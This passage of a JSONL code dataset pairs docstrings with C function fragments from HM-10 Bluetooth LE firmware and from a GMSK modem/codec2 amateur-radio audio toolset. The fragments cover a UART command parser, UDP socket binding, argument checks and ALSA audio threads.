}\n            else\n            {\n              // Since gapRole_AdvertOffTime is set to 0, the device should not\n              // automatically become discoverable again after a period of time.\n              // Set enabler to FALSE; device will become discoverable again when\n              // this value gets set to TRUE\n              gapRole_AdvEnabled = FALSE;\n            }\n\n            // In the Advertising Off period\n            gapRole_state = GAPROLE_WAITING;\n\n          }\n        }\n        else\n        {\n          gapRole_state = GAPROLE_ERROR;\n        }\n        isBroadcastMsg = TRUE;\n      }\n      break;\n      \n    default:\n      break;\n  }\n  \n  // If a broadcast event, pass to broadcast callback.\n  if ( isBroadcastMsg == TRUE )\n  {\n    // Notify the application\n    if ( pGapCentralRoleCB && pGapCentralRoleCB->broadcastCB )\n    {\n      pGapCentralRoleCB->broadcastCB( gapRole_state );\n    }\n  }\n  // Otherwise pass to central callback\n  else if ( pGapCentralRoleCB && pGapCentralRoleCB->centralCB )\n  {\n    pGapCentralRoleCB->centralCB( (gapCentralRoleEvent_t *) pMsg );\n  }\n  \n}", "path": "BLE-CC254x-1.4.0\\Projects\\ble\\HM10Firmware\\Source\\centralBroadcasterProfile.c", "repo_name": "bjoerke/HM-10-Firmware", "stars": 54, "license": "None", "language": "c", "size": 292}
{"docstring": "/**************************************************************************************************\n * @fn          main\n *\n * @brief       Start of application.\n *\n * @param       none\n *\n * @return      none\n **************************************************************************************************\n */\n", "func_signal": "int main(void)", "code": "{\n  /* Initialize hardware */\n  HAL_BOARD_INIT();\n\n  // Initialize board I/O\n  InitBoard( OB_COLD );\n\n  /* Initialze the HAL driver */\n  HalDriverInit();\n\n  /* Initialize NV system */\n  osal_snv_init();\n  \n  /* Initialize LL */\n\n  /* Initialize the operating system */\n  osal_init_system();\n\n  /* Enable interrupts */\n  HAL_ENABLE_INTERRUPTS();\n\n  // Final board initialization\n  InitBoard( OB_READY );\n\n  #if defined ( POWER_SAVING )\n    osal_pwrmgr_device( PWRMGR_BATTERY );\n  #endif\n    \n  /* Start OSAL */\n  osal_start_system(); // No Return from here\n\n  return 0;\n}", "path": "BLE-CC254x-1.4.0\\Projects\\ble\\HM10Firmware\\Source\\centralBroadcaster_Main.c", "repo_name": "bjoerke/HM-10-Firmware", "stars": 54, "license": "None", "language": "c", "size": 292}
{"docstring": "/*********************************************************************\n * @fn      gapCentralRole_RssiAlloc\n *\n * @brief   Allocate an RSSI structure.\n *\n * @param   connHandle - Connection handle\n *\n * @return  pointer to structure or NULL if allocation failed.\n */\n", "func_signal": "static gapCentralRoleRssi_t *gapCentralRole_RssiAlloc( uint16 connHandle )", "code": "{\n  uint8 i;\n\n  // Find free RSSI structure\n  for ( i = 0; i < GAPCENTRALROLE_NUM_RSSI_LINKS; i++ )\n  {\n    if ( gapCentralRoleRssi[i].connHandle == GAP_CONNHANDLE_ALL )\n    {\n      gapCentralRoleRssi[i].connHandle = connHandle;\n      return &gapCentralRoleRssi[i];\n    }\n  }\n\n  // No free structure found\n  return NULL;\n}", "path": "BLE-CC254x-1.4.0\\Projects\\ble\\HM10Firmware\\Source\\centralBroadcasterProfile.c", "repo_name": "bjoerke/HM-10-Firmware", "stars": 54, "license": "None", "language": "c", "size": 292}
{"docstring": "/*********************************************************************\n * @fn      uartManager_ProcessEvent\n *\n * @brief   This function is called to process all events for the task. Events\n *          include timers, messages and any other user defined events.\n *\n * @param   task_id  - The OSAL assigned task ID.\n * @param   events - events to process.  This is a bit map and can\n *                   contain more than one event.\n *\n * @return  events not processed\n */\n", "func_signal": "uint16 uartManager_ProcessEvent( uint8 task_id, uint16 events )", "code": "{\n  VOID task_id; // OSAL required parameter that isn't used in this function\n  \n  if ( events & SYS_EVENT_MSG )\n  {\n    uint8 *pMsg;\n    if ( (pMsg = osal_msg_receive(uartManagerTaskID )) != NULL )\n    {\n      uartManager_ProcessOSALMsg( (osal_event_hdr_t *)pMsg );\n      VOID osal_msg_deallocate( pMsg ); //Release the OSAL message\n    }\n    return (events ^ SYS_EVENT_MSG);  //return unprocessed events\n  }\n  \n  if ( events & UART_START_DEVICE_EVT )\n  {\n    HalUARTOpen(HAL_UART_PORT_1, &config);\n    osal_start_reload_timer(uartManagerTaskID, UART_PERIODIC_EVT, POLL_INTERVAL);\n    return ( events ^ UART_START_DEVICE_EVT );\n  }\n  \n  if ( events & UART_PERIODIC_EVT)\n  {\n    if(phase != PHASE_OPCODE && --remainingTries == 0)\n    {\n      send_nck();  // took too long\n      phase = PHASE_OPCODE;\n    }\n    if(Hal_UART_RxBufLen(HAL_UART_PORT_1) > 0)\n    {\n      // PHASE: OPCODE\n      if(phase == PHASE_OPCODE)\n      {\n         HalUARTRead(HAL_UART_PORT_1, &opcode, 1);\n         if(opcode == OPCODE_NULL || opcode >= OPCODE_MAX)\n         {\n           //invalid opcode\n           send_nck();\n         }\n         else\n         {\n           uint8 length = payloadLengths[opcode];\n           switch(length)\n           {\n            case 0:\n              execute_command();\n              break;\n            case PAYLOAD_LEN_UNKNOWN:\n              phase = PHASE_LENGTH;\n              remainingTries = READ_TRIES_MAX;\n              break;\n            default:\n              phase = PHASE_PAYLOAD;\n              payloadLength = length;\n              remainingPayloadLength = length;         \n              currentPayloadLength = 0;\n              remainingTries = READ_TRIES_MAX;\n              break;\n           }\n         }\n      }\n      \n      // PHASE: LENGTH\n      if(phase == PHASE_LENGTH)\n      {\n        if(Hal_UART_RxBufLen(HAL_UART_PORT_1) >= 1)\n        {       \n          HalUARTRead(HAL_UART_PORT_1, &payloadLength, 1);\n          remainingPayloadLength = payloadLength;         \n          currentPayloadLength = 0;\n          remainingTries = READ_TRIES_MAX;\n          phase = PHASE_PAYLOAD;\n        }\n      }\n      \n      // PHASE: PAYLOAD\n      if(phase == PHASE_PAYLOAD)\n      {\n        uint8 bytesRead = HalUARTRead(HAL_UART_PORT_1, &payloadData[currentPayloadLength], remainingPayloadLength);\n        currentPayloadLength += bytesRead;\n        remainingPayloadLength -= bytesRead;\n        if(remainingPayloadLength == 0)\n        {\n          execute_command();\n          phase = PHASE_OPCODE;\n        }\n      }\n    }\n    return ( events ^ UART_PERIODIC_EVT );\n  }\n  \n  // Discard unknown events\n  return 0;\n}", "path": "BLE-CC254x-1.4.0\\Projects\\ble\\HM10Firmware\\Source\\uartManager.c", "repo_name": "bjoerke/HM-10-Firmware", "stars": 54, "license": "None", "language": "c", "size": 292}
{"docstring": "// end if\n", "func_signal": "if ((global.ipv4only) && (global.ipv6only))", "code": "{\n\tfprintf(stderr,\"Error: ipv4only and ipv6only are mutually exclusive! \\n\");\n\texit(-1);\n}", "path": "gmskmodem_codec2\\audiotools\\audiotool.c", "repo_name": "on1arf/gmsk", "stars": 39, "license": "None", "language": "c", "size": 1250}
{"docstring": "// check result of \"bind\"\n", "func_signal": "if (ret < 0)", "code": "{\n\tfprintf(stderr,\"Error: could not bind network-address to socket: %d (%s) \\n\",errno,strerror(errno));\n\texit(-1);\n}", "path": "gmskmodem_codec2\\audiotools\\c2echo.c", "repo_name": "on1arf/gmsk", "stars": 39, "license": "None", "language": "c", "size": 1250}
{"docstring": "// end if\n", "func_signal": "if ((global.p_udpport < 0) || (global.p_udpport > 65535))", "code": "{\n\tfprintf(stderr,\"Error: Remote UDPport number must be between 0 and 65535! \\n\");\n\texit(-1);\n}", "path": "gmskmodem_codec2\\audiotools\\audiotool.c", "repo_name": "on1arf/gmsk", "stars": 39, "license": "None", "language": "c", "size": 1250}
{"docstring": "// we can receive up to 1500 octets\n", "func_signal": "if (!udpbuffer)", "code": "{\n\tfprintf(stderr,\"Error: could not allocate memory for udpbuffer!\\n\");\n\texit(-1);\n}", "path": "gmskmodem_codec2\\development\\beta\\audiotools\\audioplay_multirate_callback.c", "repo_name": "on1arf/gmsk", "stars": 39, "license": "None", "language": "c", "size": 1250}
{"docstring": "// check network ports\n", "func_signal": "if ((global.c_udpport < 0) || (global.c_udpport > 65535))", "code": "{\n\tfprintf(stderr,\"Error: Listening UDPport number must be between 0 and 65535! \\n\");\n\texit(-1);\n}", "path": "gmskmodem_codec2\\audiotools\\audiotool.c", "repo_name": "on1arf/gmsk", "stars": 39, "license": "None", "language": "c", "size": 1250}
{"docstring": "// SENDER\n", "func_signal": "if (!s_global.disable)", "code": "{\n\t// SENDER INPUT\n\n\t// start threads\n\t// start thread to read input. This runs as a seperate thread so\n\t// not to be interrupted by the \"alsa out\" interrupt driven\n\t// interrupt which can \"starve\" the main thread \n\n\tpthread_create(&thr_s_input, NULL, funct_input_codec2, (void *) &c_global); \n\n\t// start \"gmsk and buffer\" thread\n\tpthread_create(&thr_s_gmskmodulate, NULL, funct_s_modulateandbuffer, (void *) &s_global);\n\n\n\t#ifdef _USEALSA\n\t\t// start \"PTT\" thread.\n\t\tif (s_global.pttcsdevice) {\n\t\t\tpthread_create(&thr_s_ptt, NULL, funct_pttcs, (void *) &c_global);\n\t\t} else if (s_global.ptttxdevice) {\n\t\t\tpthread_create(&thr_s_ptt, NULL, funct_ptttx, (void *) &c_global);\n\t\t} else if (s_global.pttlockfile) {\n\t\t\tpthread_create(&thr_s_ptt, NULL, funct_pttlockfile, (void *) &c_global);\n\t\t}; // end elsif - elsif - if\n\t#endif\n\n\t// SENDER OUTPUT\n\n\t#ifdef _USEALSA\n\t\t// start file out or alsa out\n\t\tif (s_global.fileoralsa == 0) {\n\t\t\tpthread_create(&thr_s_writefile, NULL, funct_writefile, (void *) &s_global);\n\t\t} else if (s_global.fileoralsa == 1) {\n\t\t\tpthread_create(&thr_s_alsaout, NULL, funct_alsaout, (void *) &c_global);\n\t\t} else {\n\t\t\t// error\n\t\t\tfprintf(stderr,\"Error: Output should be either FILE or ALSA!\\n\");\n\t\t\texit(-1);\n\t\t}; // end elsif - if\n\t#else \n\t// NO alsa -> only file output possible\n\t\tpthread_create(&thr_s_writefile, NULL, funct_writefile, (void *) &s_global);\n\t#endif\n\n}", "path": "gmskmodem_codec2\\development\\beta\\2400_interleave_nofec\\gmskmodem.c", "repo_name": "on1arf/gmsk", "stars": 39, "license": "None", "language": "c", "size": 1250}
{"docstring": "// We need at least 2 arguments: destination-ip destination-udpport listening-udpport\n", "func_signal": "if (argc < 2)", "code": "{\n\tfprintf(stderr,\"Error: at least 3 arguments needed. \\n\");\n\tfprintf(stderr,\"Usage: %s [ options ] [-key | -gpio <gpioport>] -adevice <audiodevice> [-exact] -udp <destination ip-address> <destination udp port> <local udp port> \\n\",argv[0]);\n\tfprintf(stderr,\"Note: use device \\\"\\\" to get list of devices.\\n\");\n\tfprintf(stderr,\"Options: \\n\");\n\tfprintf(stderr,\"           -4: ipv4 hostlookup only\\n\");\n\tfprintf(stderr,\"           -6: ipv6 hostlookup only\\n\");\n\tfprintf(stderr,\"\\n\");\n\tfprintf(stderr,\" -forcestereo: Force stereo audio ('c' = capture, 'p' = playback, 'b' = both)\\n\");\n\tfprintf(stderr,\" -halfduplex : Audio playback/capture is half duplex\\n\");\n\tfprintf(stderr,\"\\n\");\n\tfprintf(stderr,\" -pttinvert  : ptt invert (only used for gpio user-PTT input)\\n\");\n\tfprintf(stderr,\"\\n\");\n\tfprintf(stderr,\" -v          : increase verboselevel\\n\");\n\tfprintf(stderr,\"\\n\");\n\texit(-1);\n}", "path": "gmskmodem_codec2\\audiotools\\audiotool.c", "repo_name": "on1arf/gmsk", "stars": 39, "license": "None", "language": "c", "size": 1250}
{"docstring": "// SENDER\n", "func_signal": "if (!s_global.disable)", "code": "{\n\t// SENDER INPUT\n\n\t// start threads\n\t// start thread to read input. This runs as a seperate thread so\n\t// not to be interrupted by the \"alsa out\" interrupt driven\n\t// interrupt which can \"starve\" the main thread \n\n\tpthread_create(&thr_s_input, NULL, funct_input_codec2, (void *) &c_global); \n\n\t// start \"gmsk and buffer\" thread\n\tpthread_create(&thr_s_gmskmodulate, NULL, funct_s_modulateandbuffer, (void *) &s_global);\n\n\n\t#ifdef _USEALSA\n\t\t// start \"PTT\" thread.\n\t\tif (s_global.pttcsdevice) {\n\t\t\tpthread_create(&thr_s_ptt, NULL, funct_pttcs, (void *) &c_global);\n\t\t} else if (s_global.ptttxdevice) {\n\t\t\tpthread_create(&thr_s_ptt, NULL, funct_ptttx, (void *) &c_global);\n\t\t} else if (s_global.pttlockfile) {\n\t\t\tpthread_create(&thr_s_ptt, NULL, funct_pttlockfile, (void *) &c_global);\n\t\t}; // end elsif - elsif - if\n\t#endif\n\n\t// SENDER OUTPUT\n\n\t#ifdef _USEALSA\n\t\t// start file out or alsa out\n\t\tif (s_global.fileoralsa == 0) {\n\t\t\tpthread_create(&thr_s_writefile, NULL, funct_writefile, (void *) &s_global);\n\t\t} else if (s_global.fileoralsa == 1) {\n\t\t\tpthread_create(&thr_s_alsaout, NULL, funct_alsaout, (void *) &c_global);\n\t\t} else {\n\t\t\t// error\n\t\t\tfprintf(stderr,\"Error: Output should be either FILE or ALSA!\\n\");\n\t\t\texit(-1);\n\t\t}; // end elsif - if\n\t#else \n\t// NO alsa -> only file output possible\n\t\tpthread_create(&thr_s_writefile, NULL, funct_writefile, (void *) &s_global);\n\t#endif\n\n}", "path": "gmskmodem_codec2\\development\\beta\\2400_nofecnointerleave\\gmskmodem.c", "repo_name": "on1arf/gmsk", "stars": 39, "license": "None", "language": "c", "size": 1250}
{"docstring": "// RECEIVER\n", "func_signal": "if (!r_global.disable)", "code": "{\n\t// RECEIVER INPUT\n\n\t#ifdef _USEALSA \n\t\t// INIT ALSA or FILE (depending on CLI options)\n\t\tif (r_global.fileorcapture == 0) {\n\t\t\tretval=init_alsa_capture(retmsg);\n\t\t} else if (r_global.fileorcapture == 1) {\n\t\t\tretval=init_infile(retmsg);\n\t\t} else {\n\t\t\t// not capture or file input\n\t\t\tfprintf(stderr,\"Error: invalid value for file-or-capture. Shouldn't happen!\\n\");\n\t\t\texit(-1);\n\t\t}; // end else - elsif - if\n\t#else\n\t\t// NO ALSA -> only file input possible\n\t\tretval=init_infile(retmsg);\n\t#endif\n\t\n\t// return message?\n\tif (retval < 0) {\n\t// -1: error\n\t\tfprintf(stderr,\"%s\",retmsg);\n\t\texit(-1);\n\t} else if (retval > 0) {\n\t// +1: warning\n\t\tfprintf(stderr,\"%s\",retmsg);\n\t}; // end elsif - if\n\n\t// CREATE BUFFERS to transfer audio from \"capture\" to \"process\"\n\t// functions\n\tif (r_global.stereo) {\n\t\toctetpersample=4;\n\t\tnumbuffer=128;\n\t} else {\n\t\toctetpersample=2;\n\t\tnumbuffer=256;\n\t}; // end else - if\n\n\n\t#ifdef _USEALSA\n\t\tif (r_global.fileorcapture == 0) {\n\t\t\t// if ALSA, get frame size from information returned by alsa drivers\n\t\t\tsize = r_global.frames * octetpersample;\n\t\t} else {\n\t\t\t// file, size is fixed: 960 samples\n\t\t\tsize=960 * octetpersample;\n\t\t}; // end if\n\t#else\n\t\t// file, size is fixed: 960 samples\n\t\tsize=960 * octetpersample;\n\t#endif\n\n\t// create buffers\n\tfor (loop=0;loop<numbuffer;loop++) {\n\t\tr_global.buffer[loop] = (char *) malloc(size);\n\n\t\tif (r_global.buffer[loop] == NULL) {\n\t\t\tfprintf(stderr,\"Error: could not allocate memory for buffer %d\\n\",loop);\n\t\t\texit(-1);\n\t\t}; // end if\n\n\t\t// init fileend\n\t\tr_global.fileend[loop]=0;\n\t}; // end for\n\n\t// init buffer pointers\n\tr_global.pntr_capture=0;\n\tr_global.pntr_process=numbuffer-1;\n\n\n\t// RECEIVER INPUT\n\n\t// This application is designed as a multithreaded program:\n\t// * Main thread (main): initiates programs, starts subthreads and goes\n\t// to sleep\n\t// * Capture thread (funct_capture): reads audio from ALSA audio-device\n\t// and stores in buffer\n\t// * Processing thread (funct_process): process audio-information, as\n\t// received by the capture thread\n\t// This runs as a seperate thread next to the main application to shield\n\t// it of from being constantly interrupted by the \"capture\"\n\t// timed interrupt.\n\n\t// POSIX thread \"capture\" or \"filein\"\n\t#ifdef _USEALSA\n\t\tif (r_global.fileorcapture) {\n\t\t\tpthread_create(&thr_r_input, NULL, funct_r_filein, (void *) &c_global);\n\t\t} else {\n\t\t\tpthread_create(&thr_r_input, NULL, funct_r_capture, (void *) &c_global);\n\t\t}; // end else - if\n\t#else\n\t\t// NO ALSA -> only file in \n\t\tpthread_create(&thr_r_input, NULL, funct_r_filein, (void *) &c_global);\n\t#endif\n\n\t// POSIX thread \"processaudio\"\n\t// start thread to process received audio\n\tpthread_create(&thr_r_processaudio, NULL, funct_r_processaudio_codec2, (void *) &c_global);\n\n\t// OK, done\n}", "path": "gmskmodem_codec2\\development\\beta\\2400_interleave_nofec\\gmskmodem.c", "repo_name": "on1arf/gmsk", "stars": 39, "license": "None", "language": "c", "size": 1250}
{"docstring": "// open inbound UDP socket and bind to socket\n", "func_signal": "if (IPV4ONLY)", "code": "{\n\tudpsock=socket(AF_INET,SOCK_DGRAM,0);\n\n\tlocalsa4.sin_family=AF_INET;\n\tlocalsa4.sin_port=udpport;\n\tmemset(&localsa4.sin_addr,0,sizeof(struct in_addr)); // address = \"::\" (all 0) -> we listen\n\n\treceivefromsa=(struct sockaddr *) &localsa4;\n\n\tret=bind(udpsock, receivefromsa, sizeof(localsa4)); \n\n}", "path": "gmskmodem_codec2\\development\\beta\\audiotools\\audioplay_multirate_callback.c", "repo_name": "on1arf/gmsk", "stars": 39, "license": "None", "language": "c", "size": 1250}
{"docstring": "// We need at least 1 arguments: destination-ip destination-udpport listening-udpport\n", "func_signal": "if (!global.devicename)", "code": "{\n\tfprintf(stderr,\"Error: audio devicename needed. \\n\");\n\tfprintf(stderr,\"Usage: %s [ options ] -adevice <audiodevice> [-exact]\\n\",argv[0]);\n\tfprintf(stderr,\"Note: use device \\\"\\\" to get list of devices.\\n\");\n\tfprintf(stderr,\" -forcestereo: Force stereo audio ('c' = capture, 'p' = playback, 'b' = both)\\n\");\n\tfprintf(stderr,\" -v          : increase verboselevel (repeat for more verbose)\\n\");\n\tfprintf(stderr,\"\\n\");\n\texit(-1);\n}", "path": "gmskmodem_codec2\\audiotools\\findaudiodev.c", "repo_name": "on1arf/gmsk", "stars": 39, "license": "None", "language": "c", "size": 1250}
{"docstring": "// allow memory for silence (10 ms, so numSample@40ms / 4)\n", "func_signal": "if (!silencebuffer)", "code": "{\n\t// memory could not be allocated\n\tfprintf(stderr,\"Error: could not allocate memory for silence buffer 1!\\n\");\n\texit(-1);\n}", "path": "gmskmodem_codec2\\development\\beta\\audiotools\\audioplay_multirate_callback.c", "repo_name": "on1arf/gmsk", "stars": 39, "license": "None", "language": "c", "size": 1250}
{"docstring": "// if socket not ok in ipv6, try ipv4\n", "func_signal": "if (sock < 0)", "code": "{\n\tsock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);\n\n\tif (sock < 0) {\n\t\tfprintf(stderr,\"Error creating socket: %d (%s) \\n\",errno,strerror(errno));\n\t\texit(-1);\n\t}; // end if\n\n\tlocalsa4.sin_family=AF_INET;\n\tlocalsa4.sin_port=ntohs(receiveport);\n\tmemset(&localsa4.sin_addr,0,sizeof(struct in_addr)); // address = \"0.0.0.0\" ) -> we listen on all interfaces\n\n\tlocalsa=(struct sockaddr *) &localsa4;\n\tlocalsa_size=sizeof(struct sockaddr_in);\n\n\tipversion=4;\n\n\tret=bind(sock, localsa, localsa_size); \n}", "path": "gmskmodem_codec2\\audiotools\\c2echo.c", "repo_name": "on1arf/gmsk", "stars": 39, "license": "None", "language": "c", "size": 1250}
{"docstring": "// dropped out of endless loop. Should not happen\n", "func_signal": "if (pa_ret < 0)", "code": "{\n\tPa_Terminate();\n\tfprintf(stderr,\"Error in Pa_isStreamActive: %s(%d) \\n\",Pa_GetErrorText(pa_ret),pa_ret);\n\texit(-1);\n}", "path": "gmskmodem_codec2\\development\\beta\\audiotools\\audioplay_multirate_callback.c", "repo_name": "on1arf/gmsk", "stars": 39, "license": "None", "language": "c", "size": 1250}
{"docstring": "// end else - elsif - if\n", "func_signal": "if (ret < 0)", "code": "{\n\tfprintf(stderr,\"Error: could not bind network-address to socket: %d (%s) \\n\",errno,strerror(errno));\n\texit(-1);\n}", "path": "gmskmodem_codec2\\development\\beta\\audiotools\\audioplay_multirate_callback.c", "repo_name": "on1arf/gmsk", "stars": 39, "license": "None", "language": "c", "size": 1250}
{"docstring": "// RECEIVER\n", "func_signal": "if (!r_global.disable)", "code": "{\n\t// RECEIVER INPUT\n\n\t#ifdef _USEALSA \n\t\t// INIT ALSA or FILE (depending on CLI options)\n\t\tif (r_global.fileorcapture == 0) {\n\t\t\tretval=init_alsa_capture(retmsg);\n\t\t} else if (r_global.fileorcapture == 1) {\n\t\t\tretval=init_infile(retmsg);\n\t\t} else {\n\t\t\t// not capture or file input\n\t\t\tfprintf(stderr,\"Error: invalid value for file-or-capture. Shouldn't happen!\\n\");\n\t\t\texit(-1);\n\t\t}; // end else - elsif - if\n\t#else\n\t\t// NO ALSA -> only file input possible\n\t\tretval=init_infile(retmsg);\n\t#endif\n\t\n\t// return message?\n\tif (retval < 0) {\n\t// -1: error\n\t\tfprintf(stderr,\"%s\",retmsg);\n\t\texit(-1);\n\t} else if (retval > 0) {\n\t// +1: warning\n\t\tfprintf(stderr,\"%s\",retmsg);\n\t}; // end elsif - if\n\n\t// CREATE BUFFERS to transfer audio from \"capture\" to \"process\"\n\t// functions\n\tif (r_global.stereo) {\n\t\toctetpersample=4;\n\t\tnumbuffer=128;\n\t} else {\n\t\toctetpersample=2;\n\t\tnumbuffer=256;\n\t}; // end else - if\n\n\n\t#ifdef _USEALSA\n\t\tif (r_global.fileorcapture == 0) {\n\t\t\t// if ALSA, get frame size from information returned by alsa drivers\n\t\t\tsize = r_global.frames * octetpersample;\n\t\t} else {\n\t\t\t// file, size is fixed: 960 samples\n\t\t\tsize=960 * octetpersample;\n\t\t}; // end if\n\t#else\n\t\t// file, size is fixed: 960 samples\n\t\tsize=960 * octetpersample;\n\t#endif\n\n\t// create buffers\n\tfor (loop=0;loop<numbuffer;loop++) {\n\t\tr_global.buffer[loop] = (char *) malloc(size);\n\n\t\tif (r_global.buffer[loop] == NULL) {\n\t\t\tfprintf(stderr,\"Error: could not allocate memory for buffer %d\\n\",loop);\n\t\t\texit(-1);\n\t\t}; // end if\n\n\t\t// init fileend\n\t\tr_global.fileend[loop]=0;\n\t}; // end for\n\n\t// init buffer pointers\n\tr_global.pntr_capture=0;\n\tr_global.pntr_process=numbuffer-1;\n\n\n\t// RECEIVER INPUT\n\n\t// This application is designed as a multithreaded program:\n\t// * Main thread (main): initiates programs, starts subthreads and goes\n\t// to sleep\n\t// * Capture thread (funct_capture): reads audio from ALSA audio-device\n\t// and stores in buffer\n\t// * Processing thread (funct_process): process audio-information, as\n\t// received by the capture thread\n\t// This runs as a seperate thread next to the main application to shield\n\t// it of from being constantly interrupted by the \"capture\"\n\t// timed interrupt.\n\n\t// POSIX thread \"capture\" or \"filein\"\n\t#ifdef _USEALSA\n\t\tif (r_global.fileorcapture) {\n\t\t\tpthread_create(&thr_r_input, NULL, funct_r_filein, (void *) &c_global);\n\t\t} else {\n\t\t\tpthread_create(&thr_r_input, NULL, funct_r_capture, (void *) &c_global);\n\t\t}; // end else - if\n\t#else\n\t\t// NO ALSA -> only file in \n\t\tpthread_create(&thr_r_input, NULL, funct_r_filein, (void *) &c_global);\n\t#endif\n\n\t// POSIX thread \"processaudio\"\n\t// start thread to process received audio\n\tpthread_create(&thr_r_processaudio, NULL, funct_r_processaudio_codec2, (void *) &c_global);\n\n\t// OK, done\n}", "path": "gmskmodem_codec2\\development\\beta\\2400_nofecnointerleave\\gmskmodem.c", "repo_name": "on1arf/gmsk", "stars": 39, "license": "None", "language": "c", "size": 1250}
{"docstring": "// create network structure\n", "func_signal": "if ((udpport < 0) || (udpport > 65535))", "code": "{\n\tfprintf(stderr,\"Error: UDPport number must be between 0 and 65535! \\n\");\n\texit(-1);\n}", "path": "gmskmodem_codec2\\development\\beta\\audiotools\\audioplay_multirate_callback.c", "repo_name": "on1arf/gmsk", "stars": 39, "license": "None", "language": "c", "size": 1250}
{"docstring": "// end if\n", "func_signal": "if ((IPV4ONLY) && (IPV6ONLY))", "code": "{\n\tfprintf(stderr,\"Error: internal configuration error: ipv4only and ipv6only are mutually exclusive! \\n\");\n\texit(-1);\n}", "path": "gmskmodem_codec2\\development\\beta\\audiotools\\audioplay_multirate_callback.c", "repo_name": "on1arf/gmsk", "stars": 39, "license": "None", "language": "c", "size": 1250}
{"docstring": "// first try to create ipv6 socket. If we return a \"protocol not supported\" error, we set the\n// \"ipv4-only\" flag and try again\n", "func_signal": "if (!ipv4_only)", "code": "{\n\tsock = socket(AF_INET6, SOCK_DGRAM, IPPROTO_UDP);\n\n\tif (sock < 0) {\n\t\tsock=-1;\n\n\t\t// check errno\n\t\tif (errno == EAFNOSUPPORT) {\n\t\t\tif (ipv6_only) {\n\t\t\t\tfprintf(stderr,\"Error creating socket: %d (%s) \\n\",errno,strerror(errno));\n\t\t\t\texit(-1);\n\t\t\t} else {\n\t\t\t\tipv4_only=1;\n\t\t\t}; // end else - if\n\t\t} else {\n\t\t\t/* Create the UDP socket */\n\t\t\tfprintf(stderr,\"Error creating socket: %d (%s) \\n\",errno,strerror(errno));\n\t\t\texit(-1);\n\t\t}; // end else - if\n\t} else {\n\t\t// success!\n\n\t\t// if ipv6 only, set option\n\t\tif (ipv6_only) {\n\t\t\tint yes=1;\n\n\t\t\t// make socket ipv6-only.\n\t\t\tret=setsockopt(sock,IPPROTO_IPV6, IPV6_V6ONLY, (char *)&yes,sizeof(int));\n\t\t\tif (ret == -1) {\n\t\t\t\tfprintf(stderr,\"Error: IPV6ONLY option set but could not make socket ipv6 only: %d (%s)! \\n\",errno,strerror(errno));\n\t\t\t\texit(-1);\n\t\t\t}; // end if\n\t\t}; // end if\n\n\t\tlocalsa6.sin6_family=AF_INET6;\n\t\tlocalsa6.sin6_port=ntohs(receiveport);\n\t\tlocalsa6.sin6_flowinfo=0; // flows not used\n\t\tlocalsa6.sin6_scope_id=0; // we listen on all interfaces\n\t\tmemset(&localsa6.sin6_addr,0,sizeof(struct in6_addr)); // address = \"::\" (all 0) -> we listen on all interfaces\n\n\t\tlocalsa=(struct sockaddr *)&localsa6;\n\t\tlocalsa_size=sizeof(struct sockaddr_in6);\n\n\t\tipversion=6;\n\n\t\tret=bind(sock, localsa, localsa_size);\n\t}; // end if\n\n}", "path": "gmskmodem_codec2\\audiotools\\c2echo.c", "repo_name": "on1arf/gmsk", "stars": 39, "license": "None", "language": "c", "size": 1250}
{"docstring": "// state 0 = wait for start\n", "func_signal": "while (FOREVER )", "code": "{\n\t// wait for UDP packets\n\n\t// read until read or error, but ignore \"EINTR\" errors\n\twhile (FOREVER) {\n\t\tudpsize = recvfrom(udpsock, udpbuffer, 1500, 0, receivefromsa, &receivefromsa_size);\n\n\t\tif (udpsize > 0) {\n\t\t\t// break out if really packet received;\n\t\t\tbreak;\n\t\t}; // end if\n\n\t\t// break out when not error EINTR\n\t\tif (errno != EINTR) {\n\t\t\tbreak;\n\t\t}; // end if\n\t}; // end while (read valid UDP packet)\n\n\tif (udpsize < 0) {\n\t\t// error: print message, wait 1/4 of a second and retry\n\t\tfprintf(stderr,\"Error receiving UDP packets: %d (%s) \\n\",errno, strerror(errno));\n\t\tusleep(250000);\n\t\tcontinue;\n\t}; // end if\n\n\n\tif (udpsize < 4) {\n\t\t// should be at least 4 octets: to small, ignore it\n\t\tfprintf(stderr,\"Error: received UDP packet to small (size = %d). Ignoring! \\n\",udpsize);\n\t\tcontinue;\n\t}; // end if\n\n\n\t// check beginning of frame, it should contain the c2enc signature\n\tif (memcmp(udpbuffer,C2ENCAP_HEAD,3)) {\n\t\t// signature does not match, ignore packet\n\t\tcontinue;\n\t}; // end  if\n\t\n\t// check size + content\n\t// we know the udp packet is at least 4 octets, so check 4th char for type\n\tif (*c2encap_type == C2ENCAP_MARK_BEGIN) {\n\t\tif (udpsize < C2ENCAP_SIZE_MARK ) {\n\t\t\tfprintf(stderr,\"Error: received C2ENCAP BEGIN MARKER with to small size: %d octets! Ignoring\\n\",udpsize);\n\t\t\tcontinue;\n\t\t} else if (udpsize > C2ENCAP_SIZE_MARK) {\n\t\t\tfprintf(stderr,\"Warning: received C2ENCAP BEGIN MARKER with to large size: %d octets! Ignoring extra data\\n\",udpsize);\n\t\t};\n\n\t\t// check content\n\t\tif (memcmp(c2encap_begindata,\"BEG\",3)) {\n\t\t\tfprintf(stderr,\"Error: RECEIVED C2ENCAP BEGIN MARKER WITH INCORRECT TEXT: 0X%02X 0X%02X 0X%02X. Ignoring frame!\\n\",udpbuffer[4],udpbuffer[5],udpbuffer[6]);\n\t\t\tcontinue;\n\t\t}; // end if\n\t} else if (*c2encap_type == C2ENCAP_MARK_END) {\n\t\tif (udpsize < C2ENCAP_SIZE_MARK ) {\n\t\t\tfprintf(stderr,\"Error: received C2ENCAP END MARKER with to small size: %d octets! Ignoring\\n\",udpsize);\n\t\t\tcontinue;\n\t\t} else if (udpsize > C2ENCAP_SIZE_MARK) {\n\t\t\tfprintf(stderr,\"Warning: received C2ENCAP END MARKER with to large size: %d octets! Ignoring extra data\\n\",udpsize);\n\t\t};\n\n\t\t// check content\n\t\tif (memcmp(c2encap_begindata,\"END\",3)) {\n\t\t\tfprintf(stderr,\"Error: RECEIVED C2ENCAP BEGIN MARKER WITH INCORRECT TEXT: 0X%02X 0X%02X 0X%02X. Ignoring frame!\\n\",udpbuffer[4],udpbuffer[5],udpbuffer[6]);\n\t\t\tcontinue;\n\t\t}; // end if\n\t} else if (*c2encap_type == C2ENCAP_DATA_VOICE1200) {\n\t\tif (udpsize < C2ENCAP_SIZE_VOICE1200 ) {\n\t\t\tfprintf(stderr,\"Warning: received C2ENCAP VOICE1200 with to small size: %d octets! 